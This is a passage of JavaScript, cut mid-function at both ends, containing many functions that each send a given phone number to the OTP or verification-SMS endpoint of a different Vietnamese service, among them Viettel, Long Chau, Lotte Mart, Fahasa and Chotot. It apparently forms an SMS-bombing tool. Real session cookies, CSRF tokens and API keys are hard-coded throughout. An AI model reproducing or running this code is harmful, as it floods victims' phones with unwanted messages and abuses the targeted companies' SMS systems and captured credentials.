    Referer: "https://viettel.vn/dang-nhap",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "X-CSRF-TOKEN": "2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i",
    "X-Requested-With": "XMLHttpRequest",
    "X-XSRF-TOKEN":
      "eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=",
    "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  };

  const data = JSON.stringify({
    phone: phone,
    type: "",
  });

  try {
    const response = await axios.post("https://viettel.vn/api/get-otp-login", data, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function viettelReg(phone) {
  const headers = {
    Accept: "application/json, text/plain, */*",
    "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    Connection: "keep-alive",
    "Content-Type": "application/json;charset=UTF-8",
    Cookie:
      "laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D",
    Origin: "https://viettel.vn",
    Referer: "https://viettel.vn/dang-ky",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "X-CSRF-TOKEN": "HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK",
    "X-Requested-With": "XMLHttpRequest",
    "X-XSRF-TOKEN":
      "eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==",
    "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  };

  const data = JSON.stringify({
    msisdn: phone,
  });

  try {
    const response = await axios.post("https://viettel.vn/api/get-otp", data, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function mochaVideo(phone) {
  const headers = {
    Accept: "application/json, text/plain, */*",
    "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "Cache-Control": "no-cache",
    Connection: "keep-alive",
    Origin: "https://video.mocha.com.vn",
    Pragma: "no-cache",
    Referer: "https://video.mocha.com.vn/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
  };

  const params = {
    msisdn: phone,
    languageCode: "vi",
  };

  try {
    const response = await axios.post("https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp", null, {
      params: params,
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function bestinc(phone) {
  const headers = {
    "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    Connection: "keep-alive",
    Origin: "https://www.best-inc.vn",
    Referer: "https://www.best-inc.vn/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    accept: "application/json",
    authorization: "null",
    "content-type": "application/json",
    "lang-type": "vi-VN",
    "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "x-auth-type": "WEB",
    "x-lan": "VI",
    "x-nat": "vi-VN",
    "x-timezone-offset": "7",
  };

  const json_data = {
    phoneNumber: phone,
    verificationCodeType: 1,
  };

  try {
    const response = await axios.post("https://v9-cc.800best.com/uc/account/sendsignupcode", json_data, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function moneyveo(phone) {
  const headers = {
    authority: "moneyveo.vn",
    accept: "*/*",
    "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    cookie:
      "CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=",
    origin: "https://moneyveo.vn",
    referer: "https://moneyveo.vn/vi/registernew/",
    "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    traceparent: "00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const json_data = {
    phoneNumber: phone,
  };

  try {
    const response = await axios.post("https://moneyveo.vn/vi/registernew/sendsmsjson", json_data, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function nhathuoclongchau(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "access-control-allow-origin": "*",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "order-channel": "1",
    origin: "https://nhathuoclongchau.com.vn",
    pragma: "no-cache",
    priority: "u=1, i",
    referer: "https://nhathuoclongchau.com.vn/",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "x-channel": "EStore",
  };

  const jsonData = {
    phoneNumber: phone,
    otpType: 0,
    fromSys: "WEBKHLC",
  };

  try {
    const response = await axios.post(
      "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
      jsonData,
      {
        headers: headers,
      }
    );
    return response;
  } catch (error) {
    throw error;
  }
}

async function acfc(phone) {
  const headers = {
    accept: "application/json, text/javascript, */*; q=0.01",
    "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    cookie:
      "_evga_d955={%22uuid%22:%22a93baeb4ee0b4f94%22}; _gcl_gs=2.1.k1$i1720297927; _gcl_au=1.1.1109989705.1720297932; _gcl_aw=GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB; _ga=GA1.1.669040222.1720297933; _sfid_599e={%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}; _tt_enable_cookie=1; _ttp=XkRw_9JIScHjzJOJvMn0bzslTxh; PHPSESSID=puf048o1vjsq9933top4t6qhv3; aws-waf-token=537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==; form_key=z6U4dNbxwcokMy9u; _fbp=fb.2.1720297944244.46181901986930848; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=c6552caa-6bee-d03e-34ca-6d9b47869e59; _ga_PS7MEHMFY3=GS1.1.1720297933.1.1.1720297944.49.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===; optiMonkSession=1720297946; form_key=z6U4dNbxwcokMy9u",
    origin: "https://www.acfc.com.vn",
    pragma: "no-cache",
    priority: "u=1, i",
    referer: "https://www.acfc.com.vn/customer/account/create/",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const jsonData = {
    number_phone: phone,
    form_key: "z6U4dNbxwcokMy9u",
    currentUrl: "https://www.acfc.com.vn/customer/account/create/",
  };

  try {
    const response = await axios.post("https://www.acfc.com.vn/mgn_customer/customer/sendOTP", jsonData, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function lottemart(phone) {
  const headers = {
    accept: "application/json",
    "accept-language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "cache-control": "no-cache",
    "content-type": "application/json",
    cookie:
      "__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0",
    origin: "https://www.lottemart.vn",
    pragma: "no-cache",
    priority: "u=1, i",
    referer: "https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  };

  const jsonData = {
    username: phone,
    case: "register",
  };

  try {
    const response = await axios.post("https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp", jsonData, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function fahasa(phone) {
  const headers = {
    accept: "application/json, text/javascript, */*; q=0.01",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    cookie:
      "frontend=543a7e08bf184f18851111677e423848; _gcl_aw=GCL.1723900031.Cj0KCQjwlIG2BhC4ARIsADBgpVTMvY6y1lNKJdeQZPyqgSDbhq7pc3JpRDenG5GnN8tEb50cZkmRcl4aAqOpEALw_wcB; _gcl_gs=2.1.k1$i1723900029; _gcl_au=1.1.1239964920.1723900031; utm_source=google; frontend_cid=kklT53i9Lgn5A3Ym; _ga=GA1.1.1741396231.1723900031; _fbp=fb.1.1723900031298.270176195147933551; _clck=11r9r9o%7C2%7Cfoe%7C0%7C1690; _tt_enable_cookie=1; _ttp=2nKwthJbFqy5ZJWAfq0J-Q-OpZx; _clsk=jd2unl%7C1723900032451%7C1%7C1%7Cr.clarity.ms%2Fcollect; moe_uuid=27ef91c9-7dbb-4f0e-ad20-976ce1d02273; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2227ef91c9-7dbb-4f0e-ad20-976ce1d02273%22%2C%22deviceAdded%22%3Atrue%7D; _ga_460L9JMC2G=GS1.1.1723900030.1.0.1723900039.51.0.1153943376; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1723900046402; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; SESSION=%7B%22sessionKey%22%3A%227dbacfe3-be5f-4089-97ce-6e37828556c0%22%2C%22sessionStartTime%22%3A%222024-08-17T13%3A07%3A13.128Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1723901846420%2C%22numberOfSessions%22%3A3%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fwww.fahasa.com%2F%3Futm_source%3Dgoogle%26utm_medium%3Dcpc_search%26utm_campaign%3Dtraffic_search_keyword%26utm_content%3Dkwd-298471633621%26utm_term%3Dfahasa%26gad_source%3D1%26gclid%3DCj0KCQjwlIG2BhC4ARIsADBgpVTMvY6y1lNKJdeQZPyqgSDbhq7pc3JpRDenG5GnN8tEb50cZkmRcl4aAqOpEALw_wcB%22%2C%22source%22%3A%22google%22%2C%22medium%22%3A%22cpc_search%22%2C%22term%22%3A%22fahasa%22%2C%22campaign_name%22%3A%22traffic_search_keyword%22%2C%22content%22%3A%22kwd-298471633621%22%7D%7D",
    origin: "https://www.fahasa.com",
    priority: "u=1, i",
    referer:
      "https://www.fahasa.com/?utm_source=google&utm_medium=cpc_search&utm_campaign=traffic_search_keyword&utm_content=kwd-298471633621&utm_term=fahasa&gad_source=1&gclid=Cj0KCQjwlIG2BhC4ARIsADBgpVTMvY6y1lNKJdeQZPyqgSDbhq7pc3JpRDenG5GnN8tEb50cZkmRcl4aAqOpEALw_wcB",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    traceparent: "00-89b87a1d3496a15b2461c068a990245b-374d059f9ff458d3-01",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  };

  const jsonData = {
    phone: phone,
  };

  try {
    const response = await axios.post("https://www.fahasa.com/ajaxlogin/ajax/checkPhone", jsonData, {
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function sms30Shine(phone) {
  const headers = {
    accept: "application/json",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    authorization: "",
    "content-type": "application/json",
    origin: "https://30shine.com",
    priority: "u=1, i",
    referer: "https://30shine.com/",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phone: phone,
    brandName: "30SHINE",
  };

  try {
    const response = await axios.post(
      "https://f9q6qhckw1.execute-api.ap-southeast-1.amazonaws.com/Product/api/v1/auth/verify",
      jsonData,
      {
        headers: headers,
      }
    );
    return response;
  } catch (error) {
    throw error;
  }
}

async function reebok(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "vi",
    "content-type": "application/json",
    key: "fb787031af64d175c8f993c778c04a89",
    origin: "https://reebok.com.vn",
    priority: "u=1, i",
    referer: "https://reebok.com.vn/",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    timestamp: "1723898299590",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phoneNumber: phone,
  };

  try {
    const response = await axios.post(
      "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification",
      jsonData,
      {
        headers: headers,
      }
    );
    return response;
  } catch (error) {
    throw error;
  }
}

async function thefaceshop(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "vi",
    "content-type": "application/json",
    key: "578ee65faaf67857e62319ea4436484f",
    origin: "https://thefaceshop.com.vn",
    priority: "u=1, i",
    referer: "https://thefaceshop.com.vn/",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    timestamp: "1723898109664",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phoneNumber: phone,
  };

  try {
    const response = await axios.post(
      "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
      jsonData,
      {
        headers: headers,
      }
    );
    return response;
  } catch (error) {
    throw error;
  }
}

async function chototReg(phone) {
  const headers = {
    authority: "id.chotot.com",
    accept: "*/*",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
    baggage:
      "sentry-environment=prod,sentry-release=ct-web-chotot-id%402.0.0,sentry-transaction=%2Fregister%2Fotp,sentry-public_key=a0cf9ad72b214ec5a3264cec648ff179,sentry-trace_id=df6d9c7e225640bfad7e87f097cc4fe9,sentry-sample_rate=0.1",
    referer: "https://id.chotot.com/register",
    "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sentry-trace": "df6d9c7e225640bfad7e87f097cc4fe9-968a246074f5abf4-0",
    "user-agent":
      "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "x-nextjs-data": "1",
    Cookie:
      "_cfuvid=UvkeJZC9XtUfgoD_t9iL9Yg50aOby.AK3LiMcTohzMs-1738823268374-0.0.1.1-604800000; cf_clearance=nWjF83udtaMlL9cX7XONvh1WCMhaO4h0t6nThFz_8t4-1738823268-1.2.1.1-iviyOa2JO_xeX0mDoxEWjMuzy2UUrcpS2BcGNzptBmJ1gepV592S1do4SdamvM8NEv6nwJJzFBn1J3jdPieE8mQ0hhC0pToS2NBMrmcEsEIsNL0IXjrEGEvJZ81elB3mjAlgyRUjdb64AYHuoIQEzEvTNfHh9DEXBD7Hy0ySvzWa6hPK0ggvMFd3pUejBwhGWPgeLqL9UEzOUDIrLSLOqX0vGAxUKAdB4HWHdWiOiASGDAptTgE0f1vuRKaEQwmCnRd2_QpqT_DxrSaEiVQSCShJ.bbEFRJwF.r.3N1smiE; _gcl_au=1.1.1351528726.1738823270; ctfp=fb7fbb55-a5f4-45ab-b0bd-19c698a5448a; _fbp=fb.1.1738823269824.1830708124; _cc_id=56a80c2fc5065577391de0babf9a87d5; panoramaId_expiry=1739428070206; panoramaId=0ecbbf900720bf5d465003bbf99b16d53938bc5c744223d03967cca3d2eb49be; panoramaIdType=panoIndiv; device_id_1738823275=Uc4Xdl1o2Y-1738823275; ipqsd=414425505069016300; _gid=GA1.2.1195124082.1738823277; _gat_UA-54934741-3=1; communicationToken=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdC1sb2dpYy11bmktcGxhdGZvcm0iLCJzdWIiOiJmYjdmYmI1NS1hNWY0LTQ1YWItYjBiZC0xOWM2OThhNTQ0OGEiLCJleHAiOjE3Mzg5MDk2NzYsImlhdCI6MTczODgyMzI3Nn0.qKkH8hlesw_ZpDoTpN_yNl335eL7Fj1fNpDfottCYBdrM8iEBaSF58Uj-NGgDhWn3o4bF5DIWDxnl-hVkV29N6vPH9W05NIfQ532QuTTwyLVL14ZRx9U3ipVf8nCDHGLSH0pTKReJJZqkldZd2njy9cn9Y2KfH5IJcOB8PIVJmmvONVnZuCLwdaaCCP1lYRCfF98viiyUOZwmnqujnhlx9trcXQQJ7IzLsmfjWJWPxGMojjFJD4qDi6onvoTPcYXJh17FDNdAMRXkhDn3WEZ1fAwnUkSzoeQPVRYw_zXj7AnLu7vJO3Mh9y_tISXbzJVmm0oPnoYt9gAZekRRbOnrA; device_id_1738823277=Uc4Xl7Akqx-1738823277; FCNEC=%5B%5B%22AKsRol_0ajA-Y3GQk6aEuoaFdKArMJt6c5mQDonHgasHQruPyAsZmjPNMxQbqByHZgOVvZGt-fOddBYKz5gWlD2X6kkAxLinz2XBs43Dk2Ih792snINkRfroSfrsWI72h5E3o6hBpmZZWvqxIz0rzy9IFE7uSdjJyA%3D%3D%22%5D%5D; ct-idfp=d2793a1d-e805-55d8-9fda-88078ccf3983; _ga=GA1.2.480047997.1738823270; _ga_FKHY4VS1S1=GS1.1.1738823269.1.1.1738823287.0.0.0; _ga_XQVN5K27XX=GS1.1.1738823276.1.1.1738823330.6.0.0",
  };

  const jsonData = {
    phone: phone,
    continue: "",
  };

  try {
    const response = await axios.get("https://id.chotot.com/_next/data/A_zx3rJXiqgg1G7-VX9xd/register/otp.json", {
      params: jsonData,
      headers: headers,
    });
    return response;
  } catch (error) {
    throw error;
  }
}

async function beautybox(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "vi",
    "cache-control": "no-cache",
    "content-type": "application/json",
    key: "584294d68530c7b753d7f5a77c1ddbc2",
    origin: "https://beautybox.com.vn",
    pragma: "no-cache",
    priority: "u=1, i",
    referer: "https://beautybox.com.vn/",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    timestamp: "1720624059192",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  };

  const jsonData = {
    phoneNumber: phone,
  };

  try {
    const response = await axios.post(
      "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
      jsonData,
      {
        headers: headers,
      }
    );
    return response;
  } catch (error) {
    throw error;
  }
}

async function vinwonders(phone) {
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-language": "vi-VN",
    "content-type": "application/json; charset=UTF-8",
    origin: "https://booking.vinwonders.com",
    priority: "u=1, i",
    "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
  };

  const jsonData = {
    UserName: phone,
    channel: 10,
  };

  try {
    const response = await axios.post(
      "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/check-user",
      jsonData,
      { headers }
    );
    return response;
  } catch (error) {
    throw error;
  }
}

async function guardian(phone) {
  const headers = {
    accept: "*/*",
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    cookie:
      'PHPSESSID=9gbshm8uc6ubebrqb6qllnjqce; PHPSESSID=9gbshm8uc6ubebrqb6qllnjqce; _ga=GA1.1.998865534.1738805286; _fbp=fb.2.1738805286786.525535218681762313; form_key=c5lz2L4XNFmruREw; form_key=c5lz2L4XNFmruREw; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; _gcl_au=1.1.1372826066.1738805294; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _tt_enable_cookie=1; _ttp=4gdOxGUexuyjHwfQfHGlGrv8O1q.tt.2; section_data_ids={%22customer%22:1738805296%2C%22compare-products%22:1738805296%2C%22last-ordered-items%22:1738805296%2C%22cart%22:1738805296%2C%22directory-data%22:1738805296%2C%22captcha%22:1738805296%2C%22wishlist%22:1738805296%2C%22instant-purchase%22:1738805296%2C%22loggedAsCustomer%22:1738805296%2C%22multiplewishlist%22:1738805296%2C%22persistent%22:1738805296%2C%22review%22:1738805296%2C%22ammessages%22:1738805296%2C%22amasty-storepickup-data%22:1737620508%2C%22magenest-fbpixel-atc%22:1738805308%2C%22magenest-fbpixel-subscribe%22:1738805296%2C%22google-tag-manager-product-info%22:1738805296%2C%22recently_viewed_product%22:1738805296%2C%22recently_compared_product%22:1738805296%2C%22product_data_storage%22:1738805296%2C%22paypal-billing-agreement%22:1738805296}; private_content_version=5b11fc1fd8544dae7bc4ea69cf25d158; mage-banners-cache-storage={}; magenest_cookie_popup={"view_page":4}; 